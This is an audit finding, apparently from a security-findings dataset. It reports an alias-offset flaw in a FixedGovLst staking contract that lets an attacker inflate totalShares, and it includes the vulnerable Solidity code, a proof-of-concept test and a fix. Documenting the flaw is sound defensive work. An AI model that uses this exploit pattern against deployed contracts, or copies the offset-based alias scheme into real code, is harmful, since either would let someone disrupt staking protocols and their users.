# [M] Inflation of totalShares in FixedGovLst Due to Alias Address Exploit

## Summary
Severity: Medium
Reporter: aksoy, also found by cergyk and Kasheeda
Contest weight: 0.6673
Dataset id: 4962
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
The FixedGovLst contract uses the fixedAlias function to generate alias addresses by adding a fixed offset (ALIAS_OFFSET = 0x010101) to the original address. An attacker can exploit this by transferring tokens to an address that is ALIAS_OFFSET less than their own address (_receiver = address(this) - ALIAS_OFFSET). This causes the transferFixed function in the GovLst contract to update the shareBalances of the alias address (_receiver.fixedAlias()), which resolves back to the original address.
Since GovLst balance increased for the user, these GovLst tokens can be used to unstake or converted FixedGovLst without decreasing totalShares. By repeatedly transferring tokens to the alias address and converting them back, the attacker can artificially inflate the totalShares in the FixedGovLst contract. This can lead to an overflow of totalShares, preventing new stakes or rescues.
```solidity
function transfer(address _to, uint256 _fixedTokens) external virtual returns (bool) {
    _transfer(msg.sender, _to, _fixedTokens);
    return true;
}

function _transfer(address _from, address _to, uint256 _fixedTokens) internal virtual {
    if (balanceOf(_from) < _fixedTokens) {
        revert FixedGovLst__InsufficientBalance();
    }
    (uint256 _senderShares, uint256 _receiverShares) = LST.transferFixed(_from, _to, _scaleUp(_fixedTokens));
    shareBalances[_from] -= _senderShares;
    shareBalances[_to] += _receiverShares;
    emit IERC20.Transfer(_from, _to, _fixedTokens);
}
```
Example Scenario:
• Attacker = 0xaaa.
• Receiver = 0xaaa - ALIAS_OFFSET.
1. Attacker stakes 1e18 GovLst, receiving 1e18 FixedGovLst and totalShares increase 1e18*1e10.
2. Attacker transfers FixedGovLst to receiver (attacker - ALIAS_OFFSET).
3. This increased attacker GovLst balance, which attacker free to use as GovLst.
4. The attacker converts GovLst back to FixedGovLst increasing totalShares.
5. The attacker repeats the process, causing totalShares to grow indefinitely.

Impact Explanation:
An overflow of totalShares can prevent new stakes or rescues.
Likelihood Explanation: if the token price is low, an attacker can borrow a significant amount of tokens using a flash loan, making the attack easy to execute. Additionally, the GovLst shares are scaled with a SHARE_SCALE_FACTOR = 1e10, which further increase the risk of overflow.

## Proof of Concept
```solidity
// Inside stGOV/test/FixedGovLst.t.sol
contract Transfer is FixedGovLstTest {
    function test_totalSharesIncrease() public {
        address _sender = vm.addr(1);
        address _senderDelegatee = vm.addr(3);
        address _receiverDelegatee = vm.addr(4);
        uint160 ALIAS_OFFSET = 0x010101;
        address _receiver = address(uint160(_sender) - ALIAS_OFFSET);
        _assumeSafeHolders(_sender, _receiver);
        _assumeSafeDelegatees(_senderDelegatee, _receiverDelegatee);
        uint256 _stakeAmount = 10**18;
        uint256 stakeShare = 10**28;
        _mintStakeTokenUpdateFixedDelegateeAndStakeFixed(_sender, _stakeAmount, _senderDelegatee);
        assertEq(lst.balanceOf(_sender), 0);
        assertEq(lst.balanceOf(_receiver), 0);
        // Transfer to receiver (_sender - alias)
        _transferFixed(_sender, _receiver, _stakeAmount);
        // Supply = 10**18, share = 10**28
        assertEq(fixedLst.totalSupply(), _stakeAmount);
        assertEq(fixedLst.balanceOf(_sender), 0);
        assertEq(fixedLst.balanceOf(_receiver), _stakeAmount);
        // _sender balance increased and can use this as LST token
        assertEq(lst.balanceOf(_sender), _stakeAmount);
        assertEq(lst.balanceOf(_receiver), 0);
        vm.startPrank(_sender);
        fixedLst.convertToFixed(_stakeAmount);
        _transferFixed(_sender, _receiver, _stakeAmount);
        vm.startPrank(_sender);
        fixedLst.convertToFixed(_stakeAmount);
        // @audit totalSupply and totalShares only increase even though attacker use same amount
        assertEq(fixedLst.totalSupply(), 3 * _stakeAmount);
    }
}
```

## Recommendation
Instead of ALIAS_OFFSET, use a hash function to generate aliases uniquely for each address.
